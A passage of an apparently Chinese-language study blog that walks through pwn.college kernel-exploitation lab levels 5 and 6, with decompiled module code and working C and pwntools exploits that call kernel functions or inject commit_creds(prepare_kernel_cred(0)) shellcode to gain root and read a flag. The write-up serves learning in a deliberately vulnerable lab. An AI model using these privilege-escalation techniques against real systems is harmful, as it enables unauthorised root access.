+<p>如果我们把 arg 的参数传承 win 函数的地址，执行 arg 就会跳转到 win 函数提权</p>
+<h4 id="EXP："><a href="#EXP：" class="headerlink" title="EXP："></a>EXP：</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span> </span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PATH <span class="string">&quot;/proc/pwncollege&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CMD 1337</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">int</span> fd;</span><br><span class="line">    <span class="type">ssize_t</span> written;</span><br><span class="line"></span><br><span class="line">    fd = open(PATH, O_WRONLY);</span><br><span class="line">    written = ioctl(fd, CMD, <span class="number">0xffffffffc00010AD</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;successfully&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;id&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;cat /flag&quot;</span>);</span><br><span class="line">    close(fd);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> EXIT_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/61845186/1781177950577-3b88f3c5-a714-4287-a360-f09fe132dd89.png"></p>
+<h3 id="LEVEL6"><a href="#LEVEL6" class="headerlink" title="LEVEL6"></a>LEVEL6</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">init_module</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    __int64 v0; <span class="comment">// rdx</span></span><br><span class="line">    __int64 v1; <span class="comment">// rdx</span></span><br><span class="line">    __int64 v2; <span class="comment">// rdx</span></span><br><span class="line">    __int64 v3; <span class="comment">// rdx</span></span><br><span class="line">    __int64 v4; <span class="comment">// rdx</span></span><br><span class="line">    __int64 v5; <span class="comment">// rdx</span></span><br><span class="line">    __int64 v6; <span class="comment">// rdx</span></span><br><span class="line">    __int64 v7; <span class="comment">// rdx</span></span><br><span class="line"></span><br><span class="line">    shellcode = (<span class="type">unsigned</span> __int8 *)_vmalloc(<span class="number">4096</span>, <span class="number">3264</span>, _default_kernel_pte_mask &amp; <span class="number">0x163</span>);</span><br><span class="line">    proc_entry = (proc_dir_entry *)proc_create(<span class="string">&quot;pwncollege&quot;</span>, <span class="number">438</span>, <span class="number">0</span>, &amp;fops);</span><br><span class="line">    printk(&amp;unk_E3E, <span class="number">438</span>, v0);</span><br><span class="line">    printk(&amp;unk_C98, <span class="number">438</span>, v1);</span><br><span class="line">    printk(&amp;unk_E3E, <span class="number">438</span>, v2);</span><br><span class="line">    printk(&amp;unk_CC8, <span class="number">438</span>, v3);</span><br><span class="line">    printk(&amp;unk_D30, <span class="number">438</span>, v4);</span><br><span class="line">    printk(&amp;unk_D90, <span class="number">438</span>, v5);</span><br><span class="line">    printk(&amp;unk_DD8, <span class="number">438</span>, v6);</span><br><span class="line">    printk(&amp;unk_E45, <span class="number">438</span>, v7);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>在内核空间里直接申请了 4096 字节，也就是 1个内存页的大小。  </p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> __fastcall <span class="title function_">device_write</span><span class="params">(file *file, <span class="type">const</span> <span class="type">char</span> *buffer, <span class="type">size_t</span> length, <span class="type">loff_t</span> *offset)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">size_t</span> len; <span class="comment">// rdx</span></span><br><span class="line">    __int64 v6; <span class="comment">// rbp</span></span><br><span class="line"></span><br><span class="line">    printk(&amp;unk_C58, file, buffer);</span><br><span class="line">    len = <span class="number">4096</span>;</span><br><span class="line">    <span class="keyword">if</span> ( length &lt;= <span class="number">0x1000</span> )</span><br><span class="line">        len = length;</span><br><span class="line">    v6 = copy_from_user(shellcode, buffer, len);</span><br><span class="line">    ((<span class="type">void</span> (*)(<span class="type">void</span>))shellcode)();</span><br><span class="line">    <span class="keyword">return</span> length - v6;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>在 device_write 当中，<code>v6 = copy_from_user(shellcode, buffer, len);</code>直接把用户输入 copy 给内核，</p>
+<p>然后执行 shellcode，意思是只要我们编写一段 shellcode 进行提权即可</p>
+<h5 id="内核核心基地址（Kernel-Base）：0xffffffff81000000"><a href="#内核核心基地址（Kernel-Base）：0xffffffff81000000" class="headerlink" title="内核核心基地址（Kernel Base）：0xffffffff81000000"></a>内核核心基地址（Kernel Base）：<code>0xffffffff81000000</code></h5><p>这是 Linux 内核核心（Kernel Core）代码和数据的固定起始地址。</p>
+<ul>
+<li>内核自带的核心函数，比如你前面看到的 <code>commit_creds</code>、<code>prepare_kernel_cred</code>，以及系统调用的入口等，在未开启 KASLR 时，都是在这个基地址往后的偏移中。</li>
+</ul>
+<p>开始实验特权 privileged 获取 prepare_kernel_cred 和 commit_creds 函数地址：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> grep -E <span class="string">&quot;commit_creds|kernel_cred&quot;</span> /proc/kallsyms</span><br><span class="line"><span class="comment"># ffffffff81089310 T commit_creds</span></span><br><span class="line"><span class="comment"># ffffffff81089660 T prepare_kernel_cred</span></span><br></pre></td></tr></table></figure>
+
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/61845186/1781180214873-f23fbee0-bdef-451a-a575-c9b7abc100b5.png"></p>
+<p>编一段提权的 shellcode 并转换为字节码：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line"></span><br><span class="line">shellcode = asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    xor rdi, rdi</span></span><br><span class="line"><span class="string">    mov rax, 0xffffffff81089660</span></span><br><span class="line"><span class="string">    call rax</span></span><br><span class="line"><span class="string">    mov rdi, rax</span></span><br><span class="line"><span class="string">    mov rax, 0xffffffff81089310</span></span><br><span class="line"><span class="string">    call rax</span></span><br><span class="line"><span class="string">    ret</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(shellcode)</span><br></pre></td></tr></table></figure>
+
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/61845186/1781180995554-d330c86a-3066-4a47-be6f-586729b6ed18.png"></p>
+<h4 id="EXP：-1"><a href="#EXP：-1" class="headerlink" title="EXP："></a>EXP：</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PATH <span class="string">&quot;/proc/pwncollege&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> fd;</span><br><span class="line">    <span class="type">char</span> shellcode[] = <span class="string">&quot;H1\xffH\xc7\xc0`\x96\x08\x81\xff\xd0H\x89\xc7H\xc7\xc0\x10\x93\x08\x81\xff\xd0\xc3&quot;</span>;</span><br><span class="line"></span><br><span class="line">    fd = open(PATH, O_WRONLY);</span><br><span class="line">    write(fd, shellcode, <span class="built_in">strlen</span>(shellcode));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;successfully!\n&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;id&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;cat /flag&quot;</span>);</span><br><span class="line">    close(fd);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> EXIT_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/61845186/1781181367113-bdd2875c-f0e6-4696-acd0-b8e4ccd67a1e.png"></p>
+<hr>
+<p>参考资料：</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_58869209/article/details/157211065">https://blog.csdn.net/qq_58869209&#x2F;article&#x2F;details&#x2F;157211065</a></p>
+<h2 id="https-xz-aliyun-com-news-14980"><a href="#https-xz-aliyun-com-news-14980" class="headerlink" title="https://xz.aliyun.com/news/14980"></a><a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/14980">https://xz.aliyun.com/news/14980</a></h2><h2 id="title-‘Pwn-college-Kernel-1-6’date-2026-06-19-21-35-57tags-pwn-kernel-pwn-collegecategories-Notes"><a href="#title-‘Pwn-college-Kernel-1-6’date-2026-06-19-21-35-57tags-pwn-kernel-pwn-collegecategories-Notes" class="headerlink" title="title: ‘Pwn.college-Kernel-1-6’date: 2026-06-19 21:35:57tags:  - pwn  - kernel  - pwn.collegecategories:  - Notes"></a>title: ‘Pwn.college-Kernel-1-6’<br>date: 2026-06-19 21:35:57<br>tags:<br>  - pwn<br>  - kernel<br>  - pwn.college<br>categories:<br>  - Notes</h2>
+    </div>
+    <footer class="article-footer">
+      
+    </footer>
+  </div>
+    <nav id="article-nav" aria-label="Article navigation" data-aos="fade-up">
+      <div class="article-nav-link-wrap left">
+            <img data-src="/HFTTC.github.io/images/banner.webp" data-sizes="auto" alt="" class="lazyload">
+        <a href="/HFTTC.github.io/2026/06/19/ret2usr_smep%E7%BB%95%E8%BF%87_kpti%E7%BB%95%E8%BF%87%20QWB2018-core/" aria-label="前一篇: no title" title="前一篇: no title"></a>
+        <div class="article-nav-caption">前一篇</div>
+        <h3 class="article-nav-title">
+            (no title)
+        </h3>
+      </div>
+    <div class="article-nav-link-wrap right">
+          <img data-src="/HFTTC.github.io/images/banner.webp" data-sizes="auto" alt="" class="lazyload">
+      <a href="/HFTTC.github.io/2026/06/19/PHP-PWN%20d3ctf2024-pwnshell/" aria-label="后一篇: no title"  title="后一篇: no title"></a>
+      <div class="article-nav-caption">后一篇</div>
+      <h3 class="article-nav-title">
+          (no title)
+      </h3>
+    </div>
+  </nav>
+
+</article>
+
+  <section id="comments" data-aos="fade-up">
+    <div class="comment-header">
+        
+      <h2 class="comment-title">说些什么吧！</h2>
+      <div class="comment-selector">
+        <div class="comment-selector-wrap">
+            <div class="selector-item" data-selector="utterances">
+              <span>utterances</span>
+            </div>
+        </div>
+      </div>
+    </div>
+    <div class="comment-content">
+          <div class="comment utterances-comment" data-aos="fade-up"
+            id="utterances-comment">
+          </div>
+    </div>
+  </section>
+
+
+</section>
+        </div>
+        <footer id="footer" aria-label="Site footer">
+  <div style="width: 100%; overflow: hidden">
+    <div class="footer-line"></div>
+  </div>
+  <div id="footer-info">
+    <div>
+      <span class="icon-copyright"></span>
+        2020-2026
+        <span class="footer-info-sep rotate"></span>
+      HFTTC
+    </div>
+      <div>
+        基于&nbsp;<a href="https://hexo.io/" rel="noopener nofollow noreferrer" target="_blank">Hexo</a>&nbsp;
+        Theme.<a href="https://github.com/D-Sketon/hexo-theme-reimu" rel="noopener nofollow noreferrer" target="_blank">Reimu</a>
+      </div>
+      <div>
+        <span class="icon-brush"></span>
+        252.7k
+        &nbsp;|&nbsp;
+        <span class="icon-coffee"></span>
+        20:55
+      </div>
+      <div>
+        <span class="icon-eye"></span>
+        <span id="busuanzi_container_site_pv">总访问量&nbsp;<span id="busuanzi_value_site_pv"></span></span>
+        &nbsp;|&nbsp;
+        <span class="icon-user"></span>
+        <span id="busuanzi_container_site_uv">总访客量&nbsp;<span id="busuanzi_value_site_uv"></span></span>
+      </div>
+  </div>
+</footer>
+
+          <div class="sidebar-top">
+            <div class="sidebar-top-taichi rotate"></div>
+            <div class="arrow-up"></div>
+          </div>
+        <div id="mask" class="hide"></div>
+      </div>
+      <nav id="mobile-nav" aria-label="Mobile navigation">
+  <div class="sidebar-wrap">
+        <div class="sidebar-toc-sidebar"><h3 class="toc-title">文章目录</h3>
+<div class="sidebar-toc-wrapper toc-div-class" >
+    <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%8B%E8%BD%BD-pwn-college-%E9%99%84%E4%BB%B6%EF%BC%9A"><span class="toc-number">1.</span> <span class="toc-text">下载 pwn.college 附件：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#LEVEL1-%E5%AF%86%E7%A0%81%E6%A0%A1%E9%AA%8C"><span class="toc-number">2.</span> <span class="toc-text">LEVEL1_密码校验</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#IDA-%E5%88%86%E6%9E%90%E7%A8%8B%E5%BA%8F%EF%BC%9A"><span class="toc-number">2.1.</span> <span class="toc-text">IDA 分析程序：</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#init-module-%EF%BC%9A"><span class="toc-number">2.1.1.</span> <span class="toc-text">init_module()：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#cleanup-module-%EF%BC%9A"><span class="toc-number">2.1.2.</span> <span class="toc-text">cleanup_module()：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#device-write-%EF%BC%9A"><span class="toc-number">2.1.3.</span> <span class="toc-text">device_write()：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#device-read-%EF%BC%9A"><span class="toc-number">2.1.4.</span> <span class="toc-text">device_read()：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#device-open-device-realease"><span class="toc-number">2.1.5.</span> <span class="toc-text">device_open&amp;device_realease</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#EXP-%E6%80%9D%E8%B7%AF%EF%BC%9A"><span class="toc-number">2.2.</span> <span class="toc-text">EXP 思路：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#LEVEL2-%E5%86%85%E6%A0%B8%E6%97%A5%E5%BF%97"><span class="toc-number">3.</span> <span class="toc-text">LEVEL2_内核日志</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#EXP"><span class="toc-number">3.1.</span> <span class="toc-text">EXP</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#LEVEL3-%E6%8F%90%E6%9D%83%E5%87%BD%E6%95%B0"><span class="toc-number">4.</span> <span class="toc-text">LEVEL3_提权函数</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%8F%90%E6%9D%83%E6%A0%B8%E5%BF%83%E5%87%AD%E8%AF%81%EF%BC%9Acommit-creds-prepare-kernel-cred-0"><span class="toc-number">4.1.</span> <span class="toc-text">提权核心凭证：commit_creds(prepare_kernel_cred(0))</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#EXP-1"><span class="toc-number">4.2.</span> <span class="toc-text">EXP</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#LEVEL4-iotcl"><span class="toc-number">5.</span> <span class="toc-text">LEVEL4_iotcl</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#EXP-2"><span class="toc-number">5.1.</span> <span class="toc-text">EXP</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#LEVEL5-%E5%8F%82%E6%95%B0%E6%8C%87%E9%92%88%E8%B0%83%E7%94%A8"><span class="toc-number">6.</span> <span class="toc-text">LEVEL5_参数指针调用</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%86%85%E6%A0%B8%E6%A8%A1%E5%9D%97%E5%9F%BA%E5%9C%B0%E5%9D%80-Module-Base%EF%BC%89%EF%BC%9A0xffffffffc0000000"><span class="toc-number">6.1.</span> <span class="toc-text">内核模块基地址 Module_Base）：0xffffffffc0000000</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#EXP%EF%BC%9A"><span class="toc-number">6.2.</span> <span class="toc-text">EXP：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#LEVEL6"><span class="toc-number">7.</span> <span class="toc-text">LEVEL6</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%86%85%E6%A0%B8%E6%A0%B8%E5%BF%83%E5%9F%BA%E5%9C%B0%E5%9D%80%EF%BC%88Kernel-Base%EF%BC%89%EF%BC%9A0xffffffff81000000"><span class="toc-number">7.1.</span> <span class="toc-text">内核核心基地址（Kernel Base）：0xffffffff81000000</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#EXP%EF%BC%9A-1"><span class="toc-number">7.2.</span> <span class="toc-text">EXP：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#https-xz-aliyun-com-news-14980"><span class="toc-number">8.</span> <span class="toc-text">https:&#x2F;&#x2F;xz.aliyun.com&#x2F;news&#x2F;14980</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#title-%E2%80%98Pwn-college-Kernel-1-6%E2%80%99date-2026-06-19-21-35-57tags-pwn-kernel-pwn-collegecategories-Notes"><span class="toc-number">9.</span> <span class="toc-text">title: ‘Pwn.college-Kernel-1-6’date: 2026-06-19 21:35:57tags:  - pwn  - kernel  - pwn.collegecategories:  - Notes</span></a></li></ol>
+</div>
+</div>
+        <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/HFTTC.github.io/avatar/head.jpg" data-sizes="auto" alt="HFTTC" class="lazyload">
+  <div class="sidebar-author-name">HFTTC</div>
+  <div class="sidebar-description">心之所向，无问西东</div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">136</div>
+  </div>
+</div>
+<div class="sidebar-social" >
+    <div class="icon-github sidebar-social-icon">
+      <a href=https://github.com/IDCM-svg itemprop="url" target="_blank" aria-label="github" rel="noopener nofollow noreferrer"></a>
+    </div>
+</div>
+<div class="sidebar-menu">
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/" aria-label="首页"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/catalog" aria-label="目录"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">目录</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/friend" aria-label="友链"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">友链</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/archives" aria-label="归档"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">归档</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/about" aria-label="关于"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+</div>
+</div>
+  </div>
+      <div class="sidebar-btn-wrapper">
+        <div class="sidebar-toc-btn current"></div>
+        <div class="sidebar-common-btn"></div>
+      </div>
+</nav>
+
+    </div>
+      <div class="site-search">
+        <div class="reimu-popup popup">
+          <div class="reimu-search">
+            <div class="reimu-search-input-icon"></div>
+            <div id="reimu-search-input"></div>
+            <div class="popup-btn-close"></div>
+          </div>
+          <div class="reimu-results">
+            <div id="reimu-stats"></div>
+            <div id="reimu-hits"></div>
+            <div id="reimu-pagination" class="reimu-pagination"></div>
+          </div>
+          <img class="reimu-bg" src="/HFTTC.github.io/images/reimu.png" loading="lazy" decoding="async" fetchpriority="low"/>
+        </div>
+      </div>
+    
+<script src="https://npm.webcache.cn/lazysizes@5.3.2/lazysizes.min.js" integrity="sha384-3gT&#x2F;vsepWkfz&#x2F;ff7PpWNUeMzeWoH3cDhm&#x2F;A8jM7ouoAK0&#x2F;fP&#x2F;9bcHHR5kHq2nf+e" crossorigin="anonymous"></script>
+
+
+<script src="https://npm.webcache.cn/clipboard@2.0.11/dist/clipboard.min.js" integrity="sha384-J08i8An&#x2F;QeARD9ExYpvphB8BsyOj3Gh2TSh1aLINKO3L0cMSH2dN3E22zFoXEi0Q" crossorigin="anonymous"></script>
+
+
+
+
+<script src="/HFTTC.github.io/js/script.js"></script>
+
+
+  
+<script src="/HFTTC.github.io/js/aos.js"></script>
+
+  <script>
+    var aosInit = () => {
+      AOS.init({
+        duration: 1000,
+        easing: "ease",
+        once: true,
+        offset: 50,
+      });
+    };
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', aosInit);
+    } else {
+      aosInit();
+    }
+  </script>
+
+
+<script src="/HFTTC.github.io/js/pjax_script.js" data-pjax></script>
+
+
+  
+<script src="/HFTTC.github.io/js/generator_search.js" defer></script>
+
+
+
+  <script>
+    var setupFirework = () => {
+      if (!false || !window.matchMedia('(max-width: 768px)').matches) {
+        window.firework && window.firework(JSON.parse('{"excludeElements":["a","button"],"particles":[{"shape":"circle","move":["emit"],"easing":"easeOutExpo","colors":["var(--red-1)","var(--red-2)","var(--red-3)","var(--red-4)"],"number":20,"duration":[1200,1800],"shapeOptions":{"radius":[16,32],"alpha":[0.3,0.5]}},{"shape":"circle","move":["diffuse"],"easing":"easeOutExpo","colors":["var(--red-0)"],"number":1,"duration":[1200,1800],"shapeOptions":{"radius":20,"alpha":[0.2,0.5],"lineWidth":6}}]}'));
+      }
+    }
+  </script>
+  
+<script src="https://npm.webcache.cn/mouse-firework@0.2.0/dist/index.umd.js" integrity="sha384-qi9WggRt19tv8Vc7pCHW3ulMNLwrn515zaLEWZjl1px07vz8+pUoWX8n1rgq282T" crossorigin="anonymous" onload="setupFirework()" defer></script>
+
+
+
+
+
+
+<div id="lazy-script">
+  <div>
+      
+      
+      <script data-pjax>
+        window.REIMU_POST = {
+          author: "HFTTC",
+          title: "",
+          url: "https://idcm-svg.github.io/HFTTC.github.io/2026/06/19/Pwn.college-Kernel-1-6/",
+          excerpt: "",
+          description: "",
+          stripContent: "前言：没有怎么接触过 KernelPWN 但是又不知道怎么学，在网上偶然发现有这么个学习内核基础利用的网站 也就十二道题目，并且利用链并不长，决定学习一下。其实也不想一上来就学习太难的东西打消自己的积极性，另外没有一个好的基础直接学攻击手法利用链什么的总觉得有点空中楼阁，经不起考验。&amp;lt;指的我自己~~~&amp;gt; 从一开始会非常详细，往后逐渐了解之后会着重点记录  \[^_^]\  下载 pwn.college 附件：pwn.college 的 kernel 基础关卡在：https://pwn",
+          date: "Fri Jun 19 2026 21:43:37 GMT+0800",
+          updated: "Fri Jun 19 2026 21:43:51 GMT+0800",
+          cover: "/HFTTC.github.io/images/banner.webp",
+        };
+      </script>
+        
+<script src="/HFTTC.github.io/js/insert_highlight.js" data-pjax></script>
+
+      
+<script src="/HFTTC.github.io/js/tabs.js" data-pjax defer></script>
+
+      <script type="module" data-pjax>
+        (async () => {
+          const PhotoSwipeLightbox = (await safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe-lightbox.esm.min.js", "sha384-DiL6M/gG+wmTxmCRZyD1zee6lIhawn5TGvED0FOh7fXcN9B0aZ9dexSF/N6lrZi/")).default;
+          const initPswp = (gallery, children) => {
+            if (_$$(`${gallery} ${children}`).length > 0) {
+              new PhotoSwipeLightbox({
+                gallery,
+                children,
+                pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
+              }).init();
+            }
+          }
+          const pswp = () => {
+            initPswp('.article-entry', 'a.article-gallery-item');
+            initPswp('.article-gallery', 'a.article-gallery-item');
+          }
+          pswp();
+        })();
+      </script>
+        
+
+<script data-pjax>
+  var loadScript = (src, integrity) => {
+    const script = document.createElement('script');
+    script.src = src;
+    if (integrity) script.integrity = integrity;
+    script.crossOrigin = 'anonymous';
+    return script;
+  };
+
+  var commentConfigKeys = ["utterances"];
+  var commentConfig = {
+    utterances: {
+      enable: true,
+      load: () => {
+        const container = document.querySelector('.utterances-comment'); 
+        if (!container) return;
+        container.style.display = 'block';
+
+        let theme = 'auto';
+        const parsedTheme = theme === 'auto' ? (document.documentElement.getAttribute('data-theme') === 'dark' ? 'github-dark' : 'github-light') : theme;
+
+        // 创建 utterances 脚本
+        const script = document.createElement('script');
+        script.src = 'https://utteranc.es/client.js';
+        script.setAttribute('repo', 'IDCM-svg/HFTTC.github.io');
+        script.setAttribute('issue-term', 'pathname');
+        script.setAttribute('theme', parsedTheme);
+        script.setAttribute('crossorigin', 'anonymous');
+        script.async = true;
+
+        // 清空容器（防止重复加载）并插入脚本
+        container.innerHTML = '';
+        container.appendChild(script);
+        if (theme === 'auto') {
+          const themeHandler = (e) => {
+            const iframe = container.querySelector('iframe.utterances-frame');
+            if (!iframe || !iframe.contentWindow) {
+              document.body.removeEventListener('reimu:theme-set', themeHandler);
+              return;
+            }
+            iframe.contentWindow.postMessage({ type: 'set-theme', theme: e.detail.isDark ? 'github-dark' : 'github-light' }, 'https://utteranc.es');
+          };
+          document.body.addEventListener('reimu:theme-set', themeHandler);
+        }
+      }
+    },
+  }
+  commentConfig.enable = commentConfigKeys.some(key => commentConfig[key].enable);
+
+  var defaultComment = '';
+  if (commentConfig.enable) {
+    // 1. 首先检查localStorage中是否有保存的评论类型
+    var savedCommentType = localStorage.getItem('commentType');
+    
+    // 2. 如果localStorage中有值且对应的评论系统可用，就使用它
+    if (savedCommentType) {
+      if (commentConfig[savedCommentType]?.enable) {
+        defaultComment = savedCommentType;
+      }
+    }
+    
